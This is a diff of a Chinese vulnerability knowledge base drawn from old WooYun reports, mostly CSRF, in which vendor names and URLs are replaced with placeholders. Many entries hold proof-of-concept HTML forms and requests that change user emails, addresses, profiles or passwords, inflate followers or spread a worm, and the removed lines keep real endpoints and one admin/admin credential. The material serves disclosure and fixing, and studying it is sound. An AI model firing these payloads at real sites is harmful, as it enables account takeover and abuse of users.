+**详情**: 对于115网盘,上传的swf是可以被存在服务器上直接访问的,存储的域是staticdl.115.com,并且该地址是可以在未登陆下可访问的(这个倒是没什么安全问题,毕竟这个连接也是很长的,而且其他一些网盘也这么设计的)问题是my.115.com下的crossdomain.xml是这样的<allow-access-from domain="*.115.com"/>那么我们上传的文件是可以访问my.115.com下所有资源的..为了提高利用率,这里再说下圈子的flash的一个问题,flash视频在播放的时候并不是自动打开的,而是先有一个图片,点击后播放,但是脚本里对一些常见的网站是自动播放的..是这样放行的:"\\.(youku|56|ku6|kugou|tudou|sina|pptv|qiyi|某互联网公司|xiami|yinyuetai)\\.(com|cn|net)"我们只需在末尾加上.56.c
 
 **POC**: 收货地址获取的代码
 
@@ -9299,7 +9299,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 无聊到处逛，于是发现这个奇葩。收听URL：http://bbs.dlxww.com/home.php?mod=spacecp&ac=follow&op=add&hash=c5df81ce&fuid=372&infloat=yes&handlekey=card_followmod_372&inajax=1&ajaxtarget=fwin_content_card_followmod_372取消收听URL：http://bbs.dlxww.com/home.php?mod=spacecp&ac=follow&op=del&fuid=372&infloat=yes&handlekey=card_followmod_372&inajax=1&ajaxtarget=fwin_content_card_followmod_372可以用这个号试试：admin/admin（不是我的，我随手输入的，以为是后
+**详情**: 无聊到处逛，于是发现这个奇葩。收听URL：https://example.com/[已脱敏]
 
 **POC**: 输入地址成功收听：然后成功取消：
 
@@ -9321,9 +9321,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://t.jiwu.com可修改用户邮箱POC<html><!-- CSRF PoC - generated by Burp Suite Professional --><body><form action="http://t.jiwu.com/info!edit.action" method="POST"><input type="hidden" name="agent&#46;email" value="wooyun999&#64;163&#46;com" /><input type="hidden" name="agent&#46;districtId" value="22781" /><input type="hidden" name="agent&#46;streetId" value="0" /><input type="hidden" name="agent&#46;
+**详情**: https://example.com/[已脱敏] CSRF PoC - generated by Burp Suite Professional --><body><form action="https://example.com/[已脱敏]" method="POST"><input type="hidden" name="agent&#46;email" value="wooyun999&#64;163&#46;com" /><input type="hidden" name="agent&#46;districtId" value="22781" /><input type="hidden" name="agent&#46;streetId" value="0" /><input type="hidden" name="agent&#46;
 
-**POC**: 可修改用户邮箱POC<html><!-- CSRF PoC - generated by Burp Suite Professional --><body><form action="http://t.jiwu.com/info!edit.action" method="POST"><input type="hidden" name="agent&#46;email" value="wooyun999&#64;163&#46;com" /><input type="hidden" name="agent&#46;districtId" value="22781" /><input type="
+**POC**: 可修改用户邮箱POC<html><!-- CSRF PoC - generated by Burp Suite Professional --><body><form action="https://example.com/[已脱敏]" method="POST"><input type="hidden" name="agent&#46;email" value="wooyun999&#64;163&#46;com" /><input type="hidden" name="agent&#46;districtId" value="22781" /><input type="
 
 **绕过**: 直接利用
 
@@ -9343,7 +9343,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 只要知道发布的信息id即可，而id是所有人可见的。只需私信发布者如此链接：http://www.baixing.com:80/xinxi/delete?adId=文章ID&view=0
+**详情**: 只要知道发布的信息id即可，而id是所有人可见的。只需私信发布者如此链接：https://example.com/[已脱敏]
 
 **POC**: 打开新页面在url栏输入地址，即可
 
@@ -9353,8 +9353,8 @@
 ---
 
 ---
-### [wooyun-2013-043974] 腾讯公益评论CSRF微博漏洞
-**厂商**: 腾讯 | **年份**: 2013 | **类型**: CSRF
+### [wooyun-2013-043974] 某互联网公司公益评论CSRF某社交平台漏洞
+**厂商**: 某互联网公司 | **年份**: 2013 | **类型**: CSRF
 
 **元思考**: 触发信号: 功能测试
 
@@ -9367,16 +9367,16 @@
 
 **详情**: 
 
-**POC**: 登陆状态访问：http://npoapp.gongyi.qq.com/comment/sendpost_ajax/0.5189716320019215?callback=jQuery183045723340357653797_1385345479582&comment=%23%E7%88%B1%E5%9C%A8%E5%B9%BF%E9%A9%AC%E2%80%95%E2%80%95%E9%98%B3%E6%98%A5%E6%B9%BE%E8%82%9A%E5%B0%8F%E5%AD%A6%E7%88%B1%E5%BF%83%E6%A0%A1%E6%9C%8D%E8%AE%A4%E6%8D%90
+**POC**: 登陆状态访问：https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
-**修复**: 增加token,顺便说一下，我觉得这个站点貌似是不对CSRF设防的，像什么修改收货地址啥的，主要是这个会影响腾讯微博，所以拿出来。其他就不报了，乌云同站点同类型漏洞是走小厂商，伤心啊！
+**修复**: 增加token,顺便说一下，我觉得这个站点貌似是不对CSRF设防的，像什么修改收货地址啥的，主要是这个会影响某互联网公司某社交平台，所以拿出来。其他就不报了，乌云同站点同类型漏洞是走小厂商，伤心啊！
 ---
 
 ---
-### [wooyun-2013-033610] 京东商城一个csrf商家可以刷关注
-**厂商**: 京东商城 | **年份**: 2013 | **类型**: CSRF
+### [wooyun-2013-033610] 某电商平台商城一个csrf商家可以刷关注
+**厂商**: 某电商平台商城 | **年份**: 2013 | **类型**: CSRF
 
 **元思考**: 触发信号: 功能测试
 
@@ -9387,7 +9387,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 由于京东用户数量巨大，且还有第三方商家平台导致任何一个业务问题都可能对用户造成不小 的影响而且京东cookies是保存比较长时间的，那么一个小小的get的csrf可能会让很多用户中招对于某厂商的商品降价后还会有短消息提示，以厂商为例就可以去其他网站或者微博发送csrfhttp://t.jd.com/product/followProduct.action?productId=934543&t=0.0032420307736847898
+**详情**: 由于某电商平台用户数量巨大，且还有第三方商家平台导致任何一个业务问题都可能对用户造成不小 的影响而且某电商平台cookies是保存比较长时间的，那么一个小小的get的csrf可能会让很多用户中招对于某厂商的商品降价后还会有短消息提示，以厂商为例就可以去其他网站或者某社交平台发送csrfhttps://example.com/[已脱敏]
 
 **POC**: (见原文)
 
@@ -9409,9 +9409,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://www.kdnet.net/地址出现CSRF ， 导致用户无法删除，增加 且数据乱码，影响账号数据正常是这样的
+**详情**: https://example.com/[已脱敏] ， 导致用户无法删除，增加 且数据乱码，影响账号数据正常是这样的
 
-**POC**: 构造好POC<html><body><form action="http://user.kdnet.net/saveaddr.asp" method="POST"><input type="hidden" name="a" value="save" /><input type="hidden" name="delivery&#95;name" value="&#37;u963F&#37;u8428&#37;u8FBE" /><input type="hidden" name="s&#95;province" value="&#37;u5929&#37;u6D25&#37;u5E02" /><i
+**POC**: 构造好POC<html><body><form action="https://example.com/[已脱敏]" method="POST"><input type="hidden" name="a" value="save" /><input type="hidden" name="delivery&#95;name" value="&#37;u963F&#37;u8428&#37;u8FBE" /><input type="hidden" name="s&#95;province" value="&#37;u5929&#37;u6D25&#37;u5E02" /><i
 
 **绕过**: 直接利用
 
@@ -9420,7 +9420,7 @@
 
 ---
 ### [wooyun-2011-03058] SAE CSRF
-**厂商**: 新浪 | **年份**: 2011 | **类型**: 
+**厂商**: 某社交平台 | **年份**: 2011 | **类型**: 
 
 **元思考**: 触发信号: 功能测试
 
@@ -9453,7 +9453,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 注射点：http://sh.yiguo.com/UC/UserVote.aspx?commodityid=51a6e283-2547-4ae6-b687-8322ca4324d6
+**详情**: 注射点：https://example.com/[已脱敏]
 
 **POC**: (见原文)
 
@@ -9497,7 +9497,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 个人中心http://favorite.hao.360.cn/index.php?nocache=0.7832744262134323通过构造特定链接，达到用户自动收藏网址的功能。例如我想让用户自动收藏 乌云http://www.wooyun.org/首先确定我分类没有乌云这个网址然后构造地址http://favorite.hao.360.cn/editBookMark.php?hs=on&crumb=f80a4c&m=add&favCat=%25B3%25A3%25D3%25C3&favName=%25E4%25B9%258C%25E4%25BA%2591&favUrl=http%253A%252F%252Fwww.wooyun.org%252F然后构造一个iframe调用该构造地址 打开显示succes然后返回个人中心
+**详情**: 个人中心https://example.com/[已脱敏] 乌云https://example.com/[已脱敏] 打开显示succes然后返回个人中心
 
 **POC**: (见原文)
 
@@ -9507,8 +9507,8 @@
 ---
 
 ---
-### [wooyun-2013-020652] 网易微博无限制刷粉丝，可传播
-**厂商**: 网易 | **年份**: 2013 | **类型**: CSRF
+### [wooyun-2013-020652] 某互联网公司某社交平台无限制刷粉丝，可传播
+**厂商**: 某互联网公司 | **年份**: 2013 | **类型**: CSRF
 
 **元思考**: 触发信号: 功能测试
 
@@ -9519,9 +9519,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 访问以下url即可关注此人http://3g.163.com/t/follow/create/1893374605转化成短链隐蔽性更强，直接在微博上发出来即可传播没有任何限制的刷粉丝
+**详情**: 访问以下url即可关注此人https://example.com/[已脱敏]
 
-**POC**: 访问以上url直接就关注了http://t.163.com/1893374605这个人
+**POC**: 访问以上url直接就关注了https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -9551,7 +9551,7 @@
 ---
 
 ---
-### [wooyun-2013-022700] thinksns最新版微博某处配置不当可引发大规模蠕虫
+### [wooyun-2013-022700] thinksns最新版某社交平台某处配置不当可引发大规模蠕虫
 **厂商**: ThinkSNS | **年份**: 2013 | **类型**: CSRF
 
 **元思考**: 触发信号: 功能测试
@@ -9563,9 +9563,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 首页发微博处未验证token，导致可以通过一个精心构造的表单使用户发一个带有链接的微博，点击链接后的用户又会干相同的事，一传十，十传百，将会引发大规模蠕虫。
+**详情**: 首页发某社交平台处未验证token，导致可以通过一个精心构造的表单使用户发一个带有链接的某社交平台，点击链接后的用户又会干相同的事，一传十，十传百，将会引发大规模蠕虫。
 
-**POC**: POC:<html><body><form name="csrf" action="http://demo.thinksns.com/t3/index.php?app=public&mod=Feed&act=PostFeed" method="POST"><input type=text name=body value="你所不知道的关于thinksns的秘密：http://smtp.yupage.com/thinksns.htm"></input><input type=text name=app_name value="public"></input><input type=text na
+**POC**: POC:<html><body><form name="csrf" action="https://example.com/[已脱敏]" method="POST"><input type=text name=body value="你所不知道的关于thinksns的秘密：https://example.com/[已脱敏]"></input><input type=text name=app_name value="public"></input><input type=text na
 
 **绕过**: 直接利用
 
@@ -9573,7 +9573,7 @@
 ---
 
 ---
-### [wooyun-2013-025472] 搜狐微博多处GetCsrf删除消息绑定手机号
+### [wooyun-2013-025472] 搜狐某社交平台多处GetCsrf删除消息绑定手机号
 **厂商**: 搜狐 | **年份**: 2013 | **类型**: CSRF
 
 **元思考**: 触发信号: 功能测试
@@ -9585,7 +9585,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://t.sohu.com/mailBox/deleteAllMail  删除私信http://t.sohu.com/noticeBox/deleteAllNotice  删除系统消息http://t.sohu.com/settings/bindMobile/sendVerificationCode?mobileNumber=15066666666 绑定手机号
+**详情**: https://example.com/[已脱敏]  删除私信https://example.com/[已脱敏]  删除系统消息https://example.com/[已脱敏] 绑定手机号
 
 **POC**: (见原文)
 
@@ -9609,7 +9609,7 @@
 
 **详情**: 
 
-**POC**: http://mp.fanwe.net/index.php?ctl=uc_account点击账户设置。然后我在提交处抓包分析一下请求包的发现没有任何验证，而且只传了一个密码和一个确定密码、手机号码、省、市、性别、ajax这些参数而已。请求包我就不贴出来了，下面我们开刀，构造一个表单，表单代码如下：<html><head><meta charset="utf-8"/><title>csrf poc</title></head><body><form action="http://mp.fanwe.net/index.php?ctl=uc_account&act=save" method="pos
+**POC**: https://example.com/[已脱敏] charset="utf-8"/><title>csrf poc</title></head><body><form action="https://example.com/[已脱敏]" method="pos
 
 **绕过**: 直接利用
 
@@ -9629,9 +9629,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://bbs.uc.cn/home.php?mod=spacecp修改资料处
+**详情**: https://example.com/[已脱敏]
 
-**POC**: <form  target="frame_profile" enctype="multipart/form-data" method="post" action="http://bbs.uc.cn/home.php?mod=spacecp&ac=profile&op=base"><input type="hidden" name="formhash" value="6a12255c"><table cellspacing="0" cellpadding="0" id="profilelist" class="tfm"><tbody><tr><th>用户名</th><td>assfffg</td
+**POC**: <form  target="frame_profile" enctype="multipart/form-data" method="post" action="https://example.com/[已脱敏]"><input type="hidden" name="formhash" value="6a12255c"><table cellspacing="0" cellpadding="0" id="profilelist" class="tfm"><tbody><tr><th>用户名</th><td>assfffg</td
 
 **绕过**: 直接利用
 
@@ -9673,9 +9673,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 进入设置中心，修改用户个人信息：查看数据包：可以看到，无不可预测参数，故伪造恶意链接，主要代码：xmlhttp.open("POST", "http://my.pcauto.com.cn/setting/profile.jsp?req_enc=UTF-8&act=save", true);xmlhttp.withCredentials = true;xmlhttp.setRequestHeader("Content-Type","application/x-www-form-urlencoded");xmlhttp.send("nickName=wo55551&gender=2&birthday=2015-02-04&realName=%E5%BC%A0%E4%B8%89&domicileId=110103&address=fdgfdahet&zip=111111&telephone=13
+**详情**: 进入设置中心，修改用户个人信息：查看数据包：可以看到，无不可预测参数，故伪造恶意链接，主要代码：xmlhttp.open("POST", "https://example.com/[已脱敏]", true);xmlhttp.withCredentials = true;xmlhttp.setRequestHeader("Content-Type","application/x-www-form-urlencoded");xmlhttp.send("nickName=wo55551&gender=2&birthday=2015-02-04&realName=%E5%BC%A0%E4%B8%89&domicileId=110103&address=fdgfdahet&zip=111111&telephone=13
 
-**POC**: poc########伪造恶意链接，主要代码：xmlhttp.open("POST", "http://my.pcauto.com.cn/setting/profile.jsp?req_enc=UTF-8&act=save", true);xmlhttp.withCredentials = true;xmlhttp.setRequestHeader("Content-Type","application/x-www-form-urlencoded");xmlhttp.send("nickName=wo55551&gender=2&birthday=2015-02-04&realName=%E5
+**POC**: poc########伪造恶意链接，主要代码：xmlhttp.open("POST", "https://example.com/[已脱敏]", true);xmlhttp.withCredentials = true;xmlhttp.setRequestHeader("Content-Type","application/x-www-form-urlencoded");xmlhttp.send("nickName=wo55551&gender=2&birthday=2015-02-04&realName=%E5
 
 **绕过**: 直接利用
 
@@ -9695,7 +9695,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://www.vcash.cn找回密码流程（前面注册了个账号，不然还真不好靠猜的）用自己的账号走一遍找回密码流程，最后一步得到一个重置密码的接口，该接口验证不严，导致可替换用户名后重置该账号的密码接口内容如下POST http://www.vcash.cn/obiz/app/account/pwdfindreset HTTP/1.1Host: www.vcash.cnUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:42.0) Gecko/20100101 Firefox/42.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3Acce
+**详情**: https://example.com/[已脱敏] https://example.com/[已脱敏] HTTP/1.1Host: www.vcash.cnUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:42.0) Gecko/20100101 Firefox/42.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3Acce
 
 **POC**: 如上
 
@@ -9719,7 +9719,7 @@
 
 **详情**: ~~
 
-**POC**: <html><body><form action="http://www.meitu.com/user/add_address" method="POST"><input type="hidden" name="consignee&#95;name" value="?&#142;&#187;?&#142;&#187;?&#142;&#187;" /><input type="hidden" name="phone" value="18888888888" /><input type="hidden" name="province" value="15" /><input type="hidde
+**POC**: <html><body><form action="https://example.com/[已脱敏]" method="POST"><input type="hidden" name="consignee&#95;name" value="?&#142;&#187;?&#142;&#187;?&#142;&#187;" /><input type="hidden" name="phone" value="18888888888" /><input type="hidden" name="province" value="15" /><input type="hidde
 
 **绕过**: 直接利用
 
@@ -9741,7 +9741,7 @@
 
 **详情**: YOHO!有货官方网站save address设计接口缺陷导致跨站请求伪造(CSRF)（附带poc）。
 
-**POC**: poc：<html><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8"><title>CSRF跨站请求伪造安全漏洞POC</title></head><body><form action="http://www.yohobuy.com/home/address/save" method="post"><input type="hidden" name="addressee_name" value="乌云@安然意境"/><input type="hidden" name="address" value=
+**POC**: poc：<html><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8"><title>CSRF跨站请求伪造安全漏洞POC</title></head><body><form action="https://example.com/[已脱敏]" method="post"><input type="hidden" name="addressee_name" value="乌云@安然意境"/><input type="hidden" name="address" value=
 
 **绕过**: 直接利用
 
@@ -9783,7 +9783,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 那官方最新版metinfo5.2测试！第一处：任意目录删除文件出在/admin/system/uploadfile.php<?php# MetInfo Enterprise Content Management System# Copyright (C) MetInfo Co.,Ltd (http://www.metinfo.cn). All rights reserved.require_once '../login/login_check.php';require_once 'mydir.class.php';$rurls='../system/uploadfile.php?anyid='.$anyid.'&cs='.$cs.'&lang='.$lang;if($action=='deletefolder'){$filedir="../../".$filename;deldir($fi
+**详情**: 那官方最新版metinfo5.2测试！第一处：任意目录删除文件出在/admin/system/uploadfile.php<?php# MetInfo Enterprise Content Management System# Copyright (C) MetInfo Co.,Ltd (https://example.com/[已脱敏]). All rights reserved.require_once '../login/login_check.php';require_once 'mydir.class.php';$rurls='../system/uploadfile.php?anyid='.$anyid.'&cs='.$cs.'&lang='.$lang;if($action=='deletefolder'){$filedir="../../".$filename;deldir($fi
 
 **POC**: 见详细说明
 
@@ -9807,7 +9807,7 @@
 
 **详情**: 
 
-**POC**: 1.爱丽网漏洞小礼包（二），爱丽厂商我又来了！废话就不多说了，一个GET提交方式的CSRF漏洞。写日志的地址：http://member.aili.com/note/add可以看到我就一个sss和hack日志分类！下面我们在创建日志分类这里抓包一下，请求数据我就不贴上去了。通过分析，WEB端向index.php?c=member&m=room&a=addCate&cateName=（这里是你要创建的日志分类名）看到提交是GET方式的，下面我们就直接构造地址就行了。访问一下：http://member.aili.com/index.php?c=member&m=room&a=addCate&ca
+**POC**: 1.爱丽网漏洞小礼包（二），爱丽厂商我又来了！废话就不多说了，一个GET提交方式的CSRF漏洞。写日志的地址：https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -9849,7 +9849,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 修改个人信息处未加token验证，也未验证refer构造poc<html><body><form action="http://visa.ilvxing.com/ucenter/user/updateUserinfo" method="POST"><input type="hidden" name="phone" value="13088643071" /><input type="hidden" name="email" value="1&#64;q&#46;cc" /><input type="hidden" name="old&#95;password" value="" /><input type="hidden" name="new&#95;password" value="" /><input type="hidden" name="new&#95;password&#95;c
+**详情**: 修改个人信息处未加token验证，也未验证refer构造poc<html><body><form action="https://example.com/[已脱敏]" method="POST"><input type="hidden" name="phone" value="13088643071" /><input type="hidden" name="email" value="1&#64;q&#46;cc" /><input type="hidden" name="old&#95;password" value="" /><input type="hidden" name="new&#95;password" value="" /><input type="hidden" name="new&#95;password&#95;c
 
 **POC**: (见原文)
 
@@ -9859,8 +9859,8 @@
 ---
 
 ---
-### [wooyun-2013-044252] 腾讯照片墙一处csrf漏洞(已证明)
-**厂商**: 腾讯 | **年份**: 2013 | **类型**: CSRF
+### [wooyun-2013-044252] 某互联网公司照片墙一处csrf漏洞(已证明)
+**厂商**: 某互联网公司 | **年份**: 2013 | **类型**: CSRF
 
 **元思考**: 触发信号: 功能测试
 
@@ -9877,7 +9877,7 @@
 
 **绕过**: 直接利用
 
-**修复**: 1：get转换成post数据并token2：危害：小孩的照片是指的珍藏的，她可能没备份，伤心了，事后我也会去道歉。。。毕竟是孩子小时候的回忆，腾讯伤不起啊
+**修复**: 1：get转换成post数据并token2：危害：小孩的照片是指的珍藏的，她可能没备份，伤心了，事后我也会去道歉。。。毕竟是孩子小时候的回忆，某互联网公司伤不起啊
 ---
 
 ---
@@ -9893,7 +9893,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 1、问题出现在个人中心的邮件验证功能上：http://i.baofeng.com/verify_email.html我们拿用户tester123做测试。首先看看tester123当前绑定的邮箱：2、然后我们来看看设置验证邮箱的请求内容，抓了个包看看，这个包是xfkxfk123的设置验证邮箱时的请求包：GET请求的啊3、由于这里设置验证邮箱的功能存在CSRF，我们构造好url请求，让tester123访问看是否存在CSRF，构造的url如下：user.baofeng.com/user/?a=sendCheckMail&email=827731626%40qq.com&callback=Security.setEmailResult当tester123访问了如上url后，他的验证邮箱就会被更改，变成827731626@qq.com。当然，如果tester123没有绑定验证邮箱的话，这样也是一样
+**详情**: 1、问题出现在个人中心的邮件验证功能上：https://example.com/[已脱敏]
 
 **POC**: 见详细说明
 
@@ -9917,7 +9917,7 @@
 
 **详情**: 无限制顶或者踩一个视频
 
-**POC**: http://v.youku.com/v_show/id_XMzE1ODYzOTEy.html先查看当前的顶和踩的票数，再访问以下的链接，踩的票数会加1，其中__ap属性经过url编码，解码后的值为{"videoId": "XMzE1ODYzOTEy", "type": "down"}修改其中的down为up，再url编码，访问这个链接就可以顶一票，可以无限制的踩或者顶http://v.youku.com/QVideo/~ajax/updown?__rt=1&__ro=&__ap=%7B%22videoId%22%3A%20%22XMzE1ODYzOTEy%22%2C%20%22type%22
+**POC**: https://example.com/[已脱敏]"videoId": "XMzE1ODYzOTEy", "type": "down"}修改其中的down为up，再url编码，访问这个链接就可以顶一票，可以无限制的踩或者顶https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -9937,9 +9937,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 豆瓣电台的认证如下：http://www.douban.com/service/account/check_with_js?return_to=http://www.douban.fm将返回内容location.href='http://www.douban.fm?sig=67a2f068bc&response_nonce=1281936632&data=%2B%7C%81%21%D7%5D%AB%5B%AD%FCM%9F%0E%F75t0%2C%FFJ%8Fw%C6P%1A%B3F%16%A2%82%15%15%84%D4Vz%8C%9B%85g+%C3%C6%5D%FED9%96%84%D4Vz%8C%9B%85g+%C3%C6%5D%FED9%96&mode=id_res&return_to=http%3A%2F%2Fwww.douban.fm';其中的sig将作为主要的认证，而直接
+**详情**: 豆瓣电台的认证如下：https://example.com/[已脱敏]'https://example.com/[已脱敏]';其中的sig将作为主要的认证，而直接
 
-**POC**: <script src="http://www.douban.com/service/account/check_with_js?return_to=http://www.80sec.com/evil.php" from="80sec"></script>
+**POC**: <script src="https://example.com/[已脱敏]" from="80sec"></script>
 
 **绕过**: 过滤绕过
 
@@ -9969,8 +9969,8 @@
 ---
 
 ---
-### [wooyun-2013-017169] 新浪微博又一处CSRF刷粉丝
-**厂商**: 新浪微博 | **年份**: 2013 | **类型**: CSRF
+### [wooyun-2013-017169] 某社交平台某社交平台又一处CSRF刷粉丝
+**厂商**: 某社交平台某社交平台 | **年份**: 2013 | **类型**: CSRF
 
 **元思考**: 触发信号: 功能测试
 
@@ -9983,7 +9983,7 @@
 
 **详情**: 没有对referer验证，没有加token导致
 
-**POC**: 登录新浪微博社会招聘：http://campus.sina.com.cn访问如下poc页面<html><body><form id="fxx" name="fxx" action="http://campus.sina.com.cn/api/add_friend.php" method="POST"><input type="text" name="uid" value="1981622273" /><input type="submit" value="submit" /></form><script>document.fxx.submit();</script></body></html>
+**POC**: 登录某社交平台某社交平台社会招聘：https://example.com/[已脱敏] id="fxx" name="fxx" action="https://example.com/[已脱敏]" method="POST"><input type="text" name="uid" value="1981622273" /><input type="submit" value="submit" /></form><script>document.fxx.submit();</script></body></html>
 
 **绕过**: 直接利用
 
@@ -10013,8 +10013,8 @@
 ---
 
 ---
-### [wooyun-2013-017347] 我是如何刷网易微博粉丝的
-**厂商**: 网易 | **年份**: 2013 | **类型**: 设计缺陷/逻辑错误
+### [wooyun-2013-017347] 我是如何刷某互联网公司某社交平台粉丝的
+**厂商**: 某互联网公司 | **年份**: 2013 | **类型**: 设计缺陷/逻辑错误
 
 **元思考**: 触发信号: 认证接口
 
@@ -10025,13 +10025,13 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 1.今天用了网易微博，虽然功能少点但也很nice嘛！想不到我封存了5年的网易账号还在，密码也没被盗！恩，不扯了，是一个加关注的接口存在问题呢！look：http://t.163.com/share/follow?followfrom=op.wz.gfo&keyfrom=op.wz.gfo&sitechannel=no&method=follow&screenName=【微博ID】话说我也不知道从哪里找到的了，当时也忘记了截图！2.这个GET方式的加关注请求，没有防范CSRF哦，所以导致登录了网易通行证的童鞋只要访问了上述链接就会关注指定的人呢！下面我截图说下简单的利用方式吧，首先将链接直接发布在网易微博首页，并且艾特任何人，越多越好，当然配上文艺型的文字效果更好哦，由于是测试，我就不这么花哨了：生成短链接如下：
+**详情**: 1.今天用了某互联网公司某社交平台，虽然功能少点但也很nice嘛！想不到我封存了5年的某互联网公司账号还在，密码也没被盗！恩，不扯了，是一个加关注的接口存在问题呢！look：https://example.com/[已脱敏]
 
 **POC**: 3.使用IE浏览器登录另一个新申请的账号：找到刚才风萧萧吸童鞋准备好的链接，点击即可，返回如下：当然效果也有了：4.其实不用这么麻烦，该接口没有对CSRF做任何的防范，直接点击访问就会中招！但是我为了说明这种GET方式的请求，即使验证了referer，也无济于事。后面的漏洞会精彩的如果有续集的话！
 
 **绕过**: 直接利用
 
-**修复**: 1.关键请求还是改成post比较好！2.关键请求还是加token比较好！3.礼物啊礼物！年底各种忙，还不忘给网易找洞，要鼓励这种舍己为人的精神啊！春天妹子啊送个公仔撒！
+**修复**: 1.关键请求还是改成post比较好！2.关键请求还是加token比较好！3.礼物啊礼物！年底各种忙，还不忘给某互联网公司找洞，要鼓励这种舍己为人的精神啊！春天妹子啊送个公仔撒！
 ---
 
 ---
@@ -10047,13 +10047,13 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 51cto的绑定微博登陆的请求为http://ucenter.51cto.com/api/auth.php?type=sina此请求并未做csrf防护，攻击者可以在第三方网页中伪造此请求新浪微博的授权有如下特点，如果当前登陆的微博曾经授权过51cto，那么就会自动绑定成功所以我们可以找一个新浪微博登陆的csrf漏洞，让用户自动登陆攻击者的微博（新浪有此类漏洞，这里就不详细写出）然后再让用户访问绑定请求，这样就完成了对攻击者微博的绑定。攻击者使用微博登陆就可以进入用户的51cto账号
+**详情**: 51cto的绑定某社交平台登陆的请求为https://example.com/[已脱敏]
 
-**POC**: 已录视频http://v.youku.com/v_show/id_XMTQxNzEzNjgxNg==.html密码：198625
+**POC**: 已录视频https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
-**修复**: 增加csrf防护微博绑定强制使用微博用户名密码登陆
+**修复**: 增加csrf防护某社交平台绑定强制使用某社交平台用户名密码登陆
 ---
 
 ---
@@ -10069,7 +10069,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 1、http://www.qiku.com/myec/myAddress.htm2、3、POC<html><body><form action="http://www.qiku.com/address/update.htm" method="POST"><input type="hidden" name="id" value="" /><input type="hidden" name="receiver" value="fsdf" /><input type="hidden" name="mobilePhone" value="13888888888" /><input type="hidden" name="telPhone" value="" /><input type="hidden" name="provinceId" value="260" /><input type="hid
+**详情**: 1、https://example.com/[已脱敏] action="https://example.com/[已脱敏]" method="POST"><input type="hidden" name="id" value="" /><input type="hidden" name="receiver" value="fsdf" /><input type="hidden" name="mobilePhone" value="13888888888" /><input type="hidden" name="telPhone" value="" /><input type="hidden" name="provinceId" value="260" /><input type="hid
 
 **POC**: (见原文)
 
@@ -10079,7 +10079,7 @@
 ---
 
 ---
-### [wooyun-2014-060493] 蚂蜂网-新浪 OAuth 2.0 redirect_uri CSRF 漏洞
+### [wooyun-2014-060493] 蚂蜂网-某社交平台 OAuth 2.0 redirect_uri CSRF 漏洞
 **厂商**: 蚂蜂窝 | **年份**: 2014 | **类型**: CSRF
 
 **元思考**: 触发信号: 认证接口
@@ -10091,7 +10091,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 蚂蜂网-新浪 OAuth 2.0 认证流程中https://api.weibo.com/oauth2/authorize?client_id=2892344974&redirect_uri=http%3A%2F%2Fwww.mafengwo.cn%2Fconnect_sync%2Fsina_v2_sync.php&response_type=code蚂蜂网并没有提供有效方式抵抗针对redirect_uri 的CSRF 攻击。如果攻击者重新发起一个蚂蜂网-新浪  OAuth 2.0 认证请求，并截获OAuth 2.0 认证请求的返回。http://www.mafengwo.cn/connect_sync/sina_v2_sync.php?code=6e20eb6bfea2d969a8fa5435a5d106d5攻击者诱骗已经登录的网用户点击。 蚂蜂网会自动将用户的帐号同攻击者的帐号绑定到一起
+**详情**: 蚂蜂网-某社交平台 OAuth 2.0 认证流程中https://example.com/[已脱敏] 的CSRF 攻击。如果攻击者重新发起一个蚂蜂网-某社交平台  OAuth 2.0 认证请求，并截获OAuth 2.0 认证请求的返回。https://example.com/[已脱敏] 蚂蜂网会自动将用户的帐号同攻击者的帐号绑定到一起
 
 **POC**: (见原文)
 
@@ -10135,7 +10135,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 发表主题和回帖的接口均存在问题/ajax/form.aspx?publishmentSystemID=1&action=addPost （回帖）/ajax/form.aspx?publishmentSystemID=1&action=postAllInOne （发表主题）直接发POC：1.回帖<meta http-equiv=Content-Type content="text/html;charset=utf-8"><form id="addPostForm" action="http://127.0.0.1/ajax/form.aspx?publishmentSystemID=1&action=addPost" method="post"><input id="forumID" name="forumID" type="hidden" value="2"><input id="thre
